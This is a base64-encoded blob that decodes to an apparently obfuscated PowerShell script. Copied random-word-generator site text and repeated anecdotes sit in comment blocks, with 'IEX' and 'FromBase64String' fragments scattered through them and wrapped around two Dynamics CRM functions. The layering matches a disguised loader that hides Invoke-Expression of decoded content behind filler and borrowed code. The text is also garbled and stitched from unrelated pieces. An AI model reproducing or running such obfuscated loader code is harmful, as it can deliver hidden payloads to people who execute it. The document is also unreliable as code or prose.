ZWF0ZSBhIG5hbWUgZm9yIGEgcHJvZHVjdCwgYW4gZXZlbnQsIGEgYmFuZCBvciBmb3IgYW55dGhpbmcgZWxzZSwgdGhpcyB0b29sIGNhbiBiZSBxdWl0ZSBoZWxwZnVsLiBBcyB5b3UgY29uc2lkZXIgbmFtZXMsIG0oKSBhIG51bWJlciBvZiByYW5kb20gd29yZHMgYW5kIHNlZSBob3cgdGhleSBpbXBhY3Qgd2hhdCB5b3UgaGF2ZSBhbHJlYWR5IGNvbWUgdXAgd2l0aC4gSW5wdXR0aW5nIHVuaXF1ZSB3b3JkcyB5b3UgbWF5IG5vdCBoYXZlIGNvbnNpZGVyZWQgY2FuIHNwYXJrIGFkZGl0aW9uYWwgY3JlYXRpdml0eSB0byBldmVudHVhbGx5IGhlbHAgeW91IHByb2R1Y2UgdGhlIHBlcmZlY3QgbmFtZSBmb3IgeW91ciBwcm9qZWN0LiBJZiB5b3UncmUgcCgpIGZvciBnb29kIGNoYXJhY3RlciBuYW1lcyBvciBiYWJ5IG5hbWVzLCB5b3UgbWlnaHQgYmUgaW50ZXJlc3RlZCBpbiBvdXIgcmFuZG9tIG5hbWUgZ2VuZXJhdG9yLgoKVGhlIGFib3ZlIGxpc3QgaXMgbm90IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLiBUaGVyZSBhcmUgbGl0ZXJhbGx5IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIG9mIHdheXMgdGhlIFJhbmRvbSBXb3JkIEdlbmVyYXRvciBjYW4gYmUgdXNlZC4gUGxlYXNlIGZlZWwgZnJlZSB0byBzaGFyZSB0aGUgd2F5IHlvdSB1c2UgdGhpcyB0b29sLCBhbmQgd2UgYWx3YXlzIHdlbGNvbWUgc3VnZ2VzdGlvbnMgb24gaG93IHdlIGNhbiBpbXByb3ZlIGl0IHRvIHNlcnZlIHlvdSBiZXR0ZXIuIFdlIGFyZSBhbHNvIGludGVyZXN0ZWQgaW4gbmV3IHdvcmQgZ2VuZXJhdG9ycyB5b3UnZCBiZSBpbnRlcmVzdGVkIGluIHVzIGNyZWF0aW5nLiBNYW55IG9mIHRoZSB0b29scyBvbiB0aGlzIHdlYnNpdGUgY2FtZSBmcm9tIGlkZWFzIGZyb20gcGVvcGxlIGxpa2UgeW91IHdobyBjb250YWN0ZWQgdXMuIFBsZWFzZSB0YWtlIHRoZSB0aW1lIHRvIGV4cGxvcmUgdGhlIG90aGVyIHJhbmRvbSBnZW5lcmF0b3JzIHdlIGhhdmUgYXZhaWwKCiM+PCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgYSgpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBhKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIHNvbWUgZ3JhZCBzdHVkZW50cyB3ZSBqKCkgZm9yIGFuIGgoKSBwcm9ncmFtLiBBZnRlciB3ZSBoYWQgYWxsIGhhZCBrKCkgZHJpbmtzLCBvbmUgb2YgdGhlIHN0dWRlbnRzIHNhaWQgdGhleSBkb250IGxpa2Ugc21va2VzIGJlY2F1c2UgdGhleSB0YXN0ZSBsaWtlIGEuIE15IGJvc3MgcmVwbGllZCwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBzbW9rZXMuIFNvIEkgY3V0IGluLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIGEuIEkgd2FzIGFza2VkIHRvIGxlYXZlLuKAnVNvdXJjZSM+CjwjVGhhdHMgZygpIE9uZSB0aW1lIEkgYXRlIDI2IGNob2NvbGF0ZSBjaGlwIGkoKSBiZWNhdXNlIEkgd2FzIG1hZCBhdCBteSBsaXR0bGUgbCgpIGFuZCBkaWRudCB3YW50IGhlciB0byBoYXZlIGFueS4gSSBwdWtlZCBhbGwgb3ZlciB0aGUgcGxhY2Uu4oCdIFNvdXJjZSM+Cjwj4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgYSgpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiAyOHsKCgogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBBUkFNKAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtU2VydmljZUNsaWVudF0kY29ubiwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MSwgUGFyYW1ldGVyU2V0TmFtZT0iVXNlcklkIildCiAgICAgICAgW3N0cmluZ10kVXNlcklkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJRdWV1ZUlkIildCiAgICAgICAgW3N0cmluZ10kUXVldWVJZAogICAgKQoKCSRjb25uID0gVmVyaWZ5Q3JtQ29ubmVjdGlvblBhcmFtIC1jb25uICRjb25uIC1waXBlbGluZVZhbHVlICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ2Nvbm4nKSkKCiAgICBpZigkVXNlcklkIC1uZSAiIikKICAgIHsKICAgICAgICBTZXQtQ3JtUmVjb3JkIC1jb25uICRjb25uIC1FbnRpdHlMb2dpY2FsTmFtZSBzeXN0ZW11c2VyIC1JZCAkVXNlcklkIC1GaWVsZHMgQHsiZW1haWxyb3V0ZXJhY2Nlc3NhcHByb3ZhbCI9KE5ldy1Dcm1PcHRpb25TZXRWYWx1ZSAzKX0KICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBTZXQtQ3JtUmVjb3JkIC1jb25uICRjb25uIC1FbnRpdHlMb2dpY2FsTmFtZSBxdWV1ZSAtSWQgJFF1ZXVlSWQgLUZpZWxkcyBAeyJlbWFpbHJvdXRlcmFjY2Vzc2FwcHJvdmFsIj0oTmV3LUNybU9wdGlvblNldFZhbHVlIDMpfQogICAgfQp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBWb2NhYnVsYXJ5ClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIHZvY2FidWxhcnkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCBpcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAoKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBiKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIGIoKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcSSB3YXMgYXQgYSBzd2FuayBiYXIgZm9yIGEgd29yayBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCwgZSgpIHNvbWUgZ3JhZCBzdHVkZW50cyB3ZSBqKCkgZm9yIGFuIGgoKSBwcm9ncmFtLiBBZnRlciB3ZSBoYWQgYWxsIGhhZCBrKCkgZHJpbmtzLCBvbmUgb2YgdGhlIHN0dWRlbnRzIHNhaWQgdGhleSBkb250IGxpa2Ugc21va2VzIGJlY2F1c2UgdGhleSB0YXN0ZSBsaWtlIGEuIE15IGJvc3MgcmVwbGllZCwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBzbW9rZXMuIFNvIEkgY3V0IGluLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIGEuIEkgd2FzIGFza2VkIHRvIGxlYXZlLuKAnVNvdXJjZSM+CjwjVGhhdHMgZygpIE9uZSB0aW1lIEkgYXRlIDI2IGNob2NvbGF0ZSBjaGlwIGkoKSBiZWNhdXNlIEkgd2FzIG1hZCBhdCBteSBsaXR0bGUgbCgpIGFuZCBkaWRudCB3YW50IGhlciB0byBoYXZlIGFueS4gSSBwdWtlZCBhbGwgb3ZlciB0aGUgcGxhY2Uu4oCdIFNvdXJjZSM+Cjwj4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgYigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiAyOSB7CgogICAgW091dHB1dFR5cGUoW3ZvaWRdKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSgKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UsIFBvc2l0aW9uPTApXQogICAgICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdJGNvbm4sCgkJW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEsIFBhcmFtZXRlclNldE5hbWU9IkNybVJlY29yZCIsIFZhbHVlRnJvbVBpcGVsaW5lPSR0cnVlKV0KICAgICAgICBbUFNPYmplY3RbXV0kQ3JtUmVjb3JkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJOYW1lV2l0aElkIildCiAgICAgICAgW3N0cmluZ10kRW50aXR5TG9naWNhbE5hbWUsICAgICAgICAKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MiwgUGFyYW1ldGVyU2V0TmFtZT0iTmFtZVdpdGhJZCIpXQogICAgICAgIFtndWlkXSRJZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MyldCiAgICAgICAgW01pY3Jvc29mdC5Ycm0uU2RrLkVudGl0eVJlZmVyZW5jZV0kUmV2b2tlZQogICAgKQogICAgYmVnaW4KICAgIHsKICAgICAgICAkY29ubiA9IFZlcmlmeUNybUNvbm5lY3Rpb25QYXJhbSAtY29ubiAkY29ubiAtcGlwZWxpbmVWYWx1ZSAoJFBTQm91bmRQYXJhbWV0ZXJzLkNvbnRhaW5zS2V5KCdjb25uJykpCgogICAgICAgIGlmICgkRW50aXR5TG9naWNhbE5hbWUpIHsKICAgICAgICAgICAgJENybVJlY29yZCArPSBbUFNDdXN0b21PYmplY3RdIEB7CiAgICAgICAgICAgICAgICBsb2dpY2FsbmFtZSA9ICRFbnRpdHlMb2dpY2FsTmFtZQogICAgICAgICAgICAgICAgIiQoJEVudGl0eUxvZ2ljYWxOYW1lKWlkIiA9ICRJZAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgcHJvY2VzcwogICAgewogICAgICAgIGZvcmVhY2ggKCRyZWNvcmQgaW4gJENybVJlY29yZCkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJHJlcXVlc3QgPSBbTWljcm9zb2Z0LkNybS5TZGsuTWVzc2FnZXMuUmV2b2tlQWNjZXNzUmVxdWVzdF06Om5ldygpCiAgICAgICAgICAgICAgICAkcmVxdWVzdC5UYXJnZXQgPSBOZXctQ3JtRW50aXR5UmVmZXJlbmNlIC1FbnRpdHlMb2dpY2FsTmFtZSAkcmVjb3JkLmxvZ2ljYWxuYW1lIC1JZCAkcmVjb3JkLigkcmVjb3JkLmxvZ2ljYWxuYW1lICsgImlkIikKICAgICAgICAgICAgICAgICRyZXF1ZXN0LlJldm9rZWUgPSAkUmV2b2tlZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBbTWljcm9zb2Z0LkNybS5TZGsuTWVzc2FnZXMuUmV2b2tlQWNjZXNzUmVzcG9uc2VdJGNvbm4uRXhlY3V0ZSgkcmVxdWVzdCkgfCBPdXQtTnVsbAogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLUVycm9yICRfCiAgICAgICAgICAgIH0gICAKICAgICAgICB9CiAgICB9Cn0KPCM+PgpTcD1lbGxpbmcgYW5kIFZvY2FidWxhcnkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgdm9jYWJ1bGFyeSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGF